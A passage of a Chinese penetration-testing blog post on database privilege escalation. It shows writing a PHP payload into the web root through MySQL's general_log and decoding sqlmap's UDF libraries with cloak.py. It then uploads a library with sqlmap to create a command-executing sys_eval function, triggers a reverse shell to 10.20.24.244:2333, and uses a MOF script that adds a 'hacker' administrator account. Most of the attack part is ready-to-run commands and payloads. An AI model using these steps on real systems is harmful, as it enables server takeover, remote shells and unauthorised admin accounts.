+<p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 更改日志文件位置</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 查看当前配置</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>                       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> <span class="keyword">ON</span>                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span> <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>info.php <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------------------+</span></span><br><span class="line"></span><br><span class="line"># 往日志里面写入 payload</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 此时已经写到 info.php 文件当中了</span><br><span class="line">root<span class="variable">@c1595d3a029a</span>:<span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>$ cat info.php </span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>mysqld, Version: <span class="number">5.5</span><span class="number">.61</span><span class="number">-0</span>ubuntu0<span class="number">.14</span><span class="number">.04</span><span class="number">.1</span> ((Ubuntu)). started <span class="keyword">with</span>:</span><br><span class="line">Tcp port: <span class="number">3306</span>  Unix socket: <span class="operator">/</span>var<span class="operator">/</span>run<span class="operator">/</span>mysqld<span class="operator">/</span>mysqld.sock</span><br><span class="line"><span class="type">Time</span>                 Id Command    Argument</span><br><span class="line"><span class="number">201031</span> <span class="number">21</span>:<span class="number">14</span>:<span class="number">46</span>       <span class="number">40</span> Query    <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general%&#x27;</span></span><br><span class="line"><span class="number">201031</span> <span class="number">21</span>:<span class="number">15</span>:<span class="number">34</span>       <span class="number">40</span> Query    <span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些。</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><h5 id="加载动态链接库"><a href="#加载动态链接库" class="headerlink" title="加载动态链接库"></a>加载动态链接库</h5><p>如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p>
+<p>sqlmap下dll文件的位置</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap根目录<span class="operator">/</span>data<span class="operator">/</span>udf<span class="operator">/</span>mysql</span><br></pre></td></tr></table></figure>
+
+<p>不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具cloak.py 来解码使用，cloak.py 的位置为：<code>/extra/cloak/cloak.py</code> ，解码方法如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前目录情况</span></span><br><span class="line">➜ <span class="built_in">pwd</span></span><br><span class="line">/Users/guang/Documents/X1ct34m/sqlmap/1.4.6/extra/cloak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 32 位的 Linux 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 64 位的 Linux 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 32 位的 Windows 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 64 位的 Windows 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前目录下的情况</span></span><br><span class="line">➜ <span class="built_in">ls</span></span><br><span class="line">README.txt              cloak.py                lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.so</span><br><span class="line">__init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll</span><br></pre></td></tr></table></figure>
+
+<h5 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录"></a>寻找插件目录</h5><p>接下来的任务是把 UDF 的动态链接库文件放到 MySQL 的插件目录下，这个目录改如何去寻找呢？可以使用如下的 SQL 语句来查询：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name <span class="operator">|</span> <span class="keyword">Value</span>                        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> plugin_dir    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>mysql<span class="operator">/</span>lib<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 <code>\lib\plugin</code> 文件夹</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">233</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后写入动态链接库</p>
+<p>SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有<strong>字节长度限制</strong>，所以往往 POST 注入才可以执行这种攻击</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://localhost:30008/&quot; <span class="comment">--data=&quot;id=1&quot; --file-write=&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot; --file-dest=&quot;/usr/lib/mysql/plugin/udf.so&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="创建自定义函数调用命令"><a href="#创建自定义函数调用命令" class="headerlink" title="创建自定义函数调用命令"></a>创建自定义函数调用命令</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl      <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_eval <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> udf.dll <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br></pre></td></tr></table></figure>
+
+<p>这样，就是支持创建这个函数的命令执行了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="删除自定义函数"><a href="#删除自定义函数" class="headerlink" title="删除自定义函数"></a>删除自定义函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure>
+
+<h4 id="tools工具"><a href="#tools工具" class="headerlink" title="tools工具"></a>tools工具</h4><p><a target="_blank" rel="noopener" href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php</a></p>
+<p>一键 DUMP UDF 和函数，操作门槛降低了很多</p>
+<h4 id="mysql-不允许外连"><a href="#mysql-不允许外连" class="headerlink" title="mysql 不允许外连"></a>mysql 不允许外连</h4><p>这个时候可以使用 Navicat 自带的 tunnel 隧道脚本上传到目标网站上：</p>
+<p>国光师傅这里顺便打包了一份出来：<a target="_blank" rel="noopener" href="https://sqlsec.lanzoux.com/ibpoGijd6bc">蓝奏云：Navicat tunnel.zip</a> 实际上 Navicat 很久很久以前就自带这些脚本了，这个脚本有点类似于 reGeorg，只是官方的脚本用起来更舒服方便一点，脚本的界面如下：</p>
+<p><img src="https://image.3001.net/images/20201119/16057520384495.png" alt="img"></p>
+<p>接着连接的时候设置 HTTP 通道：</p>
+<p><img src="https://image.3001.net/images/20201119/16057523604421.png" alt="img"></p>
+<p>这个时候主机地址填写 localhost 即可：</p>
+<p>连接成功后自然就可以愉快地进行手工 UDF 提权啦</p>
+<h4 id="反弹端口提权"><a href="#反弹端口提权" class="headerlink" title="反弹端口提权"></a>反弹端口提权</h4><p>实际上这是 UDF 提权的另一种用法，只是这里的动态链接库被定制过的，功能更多更实用一些</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmdshell        <span class="comment"># 执行cmd</span></span><br><span class="line">downloader      <span class="comment"># 下载者,到网上下载指定文件并保存到指定目录</span></span><br><span class="line">open3389        <span class="comment"># 通用开3389终端服务,可指定端口(不改端口无需重启)</span></span><br><span class="line">backshell       <span class="comment"># 反弹Shell</span></span><br><span class="line">ProcessView     <span class="comment"># 枚举系统进程</span></span><br><span class="line">KillProcess     <span class="comment"># 终止指定进程</span></span><br><span class="line">regread         <span class="comment"># 读注册表</span></span><br><span class="line">regwrite        <span class="comment"># 写注册表</span></span><br><span class="line">shut            <span class="comment"># 关机,注销,重启</span></span><br><span class="line">about           <span class="comment"># 说明与帮助函数</span></span><br></pre></td></tr></table></figure>
+
+<p>国光师傅找的：<a target="_blank" rel="noopener" href="https://sqlsec.lanzoux.com/iEQA0ijfu6d">https://sqlsec.lanzoux.com/iEQA0ijfu6d</a></p>
+<p><img src="https://image.3001.net/images/20201119/16057546316568.png" alt="img"></p>
+<p>然后目标机器上导入 dll 动态链接库（这里偷懒就忽略了），然后创建自定义函数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> backshell <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后反弹shell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> backshell(&quot;10.20.24.244&quot;, <span class="number">2333</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功</p>
+<p>提权的原理是C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>
+<p>脚本内容如下：</p>
+<figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma name<span class="built_in">space</span>(<span class="string">&quot;\\\\.\\root\\subscription&quot;</span>) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>; </span><br><span class="line">    Name  = <span class="string">&quot;filtP2&quot;</span>; </span><br><span class="line">    Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span> </span><br><span class="line">            <span class="string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="string">&quot; &quot;</span> </span><br><span class="line">            <span class="string">&quot;And TargetInstance.Second = 5&quot;</span>; </span><br><span class="line">    QueryLanguage = <span class="string">&quot;WQL&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = <span class="string">&quot;consPCSV2&quot;</span>; </span><br><span class="line">    ScriptingEngine = <span class="string">&quot;JScript&quot;</span>; </span><br><span class="line">    ScriptText = </span><br><span class="line"><span class="string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe user hacker P@ssw0rd /add\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe localgroup administrators hacker /add\<span class="string">&quot;)&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>核心<code>payload</code>为：</p>
+<figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var WSH = <span class="keyword">new</span> ActiveXObject(\<span class="string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="sqlserver-msssql"><a href="#sqlserver-msssql" class="headerlink" title="sqlserver(msssql)"></a>sqlserver(msssql)</h2><p>需要SA权限</p>
+<h3 id="使用xp-cmdshell进行提权"><a href="#使用xp-cmdshell进行提权" class="headerlink" title="使用xp_cmdshell进行提权"></a>使用xp_cmdshell进行提权</h3><p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除</p>
+<h3 id="使用sp-oacreate进行提权-无回显"><a href="#使用sp-oacreate进行提权-无回显" class="headerlink" title="使用sp_oacreate进行提权|无回显"></a>使用sp_oacreate进行提权|无回显</h3><h3 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h3><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/270106.html">https://www.freebuf.com/articles/database/270106.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html#toc-heading-26">https://www.sqlsec.com/2020/11/mysql.html#toc-heading-26</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/276814.html">https://www.freebuf.com/vuls/276814.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#55-%E5%88%A9%E7%94%A8-mssql-%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83">https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#55-%E5%88%A9%E7%94%A8-mssql-%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">h0ld1rs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://h0ld1rs.github.io/posts/61064.html">https://h0ld1rs.github.io/posts/61064.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://h0ld1rs.github.io" target="_blank">h0ld1rs的博客</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/image/25.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/30687.html"><img class="prev-cover" src="/img/image/26.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SpringCloudFunction漏洞分析</div></div></a></div><div class="next-post pull-right"><a href="/posts/26357.html"><img class="next-cover" src="/img/image/24.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">codeql-java测试</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h0ld1rs</div><div class="author-info__description">希望能认识更多师傅，学到更多东西</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h0ld1rs"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3"><span class="toc-number">1.</span> <span class="toc-text">数据库相关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#oracle"><span class="toc-number">1.1.</span> <span class="toc-text">oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99shell%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.1.</span> <span class="toc-text">写shell的条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.2.</span> <span class="toc-text">写入方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%82%A8%E5%AD%98%E8%BF%87%E7%A8%8B%E5%86%99%E5%85%A5"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">储存过程写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E7%A9%BA%E9%97%B4%E7%BB%93%E6%9E%84%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">利用数据库表空间结构写入文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">用户提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.3.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8java%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">利用java权限提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%82%A8%E5%AD%98%E8%BF%87%E7%A8%8B%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.2.</span> <span class="toc-text">利用储存过程提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Postgresql"><span class="toc-number">1.4.</span> <span class="toc-text">Postgresql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-number">1.4.1.</span> <span class="toc-text">写入webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.2.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql"><span class="toc-number">1.5.</span> <span class="toc-text">Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99webshell"><span class="toc-number">1.5.1.</span> <span class="toc-text">写webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#into-oufile-%E5%86%99-shell"><span class="toc-number">1.5.1.0.1.</span> <span class="toc-text">into oufile 写 shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99-shell"><span class="toc-number">1.5.1.0.2.</span> <span class="toc-text">日志文件写 shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.2.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="toc-number">1.5.2.1.1.</span> <span class="toc-text">加载动态链接库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%8F%92%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="toc-number">1.5.2.1.2.</span> <span class="toc-text">寻找插件目录</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">创建自定义函数调用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">删除自定义函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tools%E5%B7%A5%E5%85%B7"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">tools工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql-%E4%B8%8D%E5%85%81%E8%AE%B8%E5%A4%96%E8%BF%9E"><span class="toc-number">1.5.2.5.</span> <span class="toc-text">mysql 不允许外连</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.2.6.</span> <span class="toc-text">反弹端口提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MOF%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.3.</span> <span class="toc-text">MOF提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlserver-msssql"><span class="toc-number">1.6.</span> <span class="toc-text">sqlserver(msssql)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8xp-cmdshell%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.1.</span> <span class="toc-text">使用xp_cmdshell进行提权</span></a></li><li class="toc-item 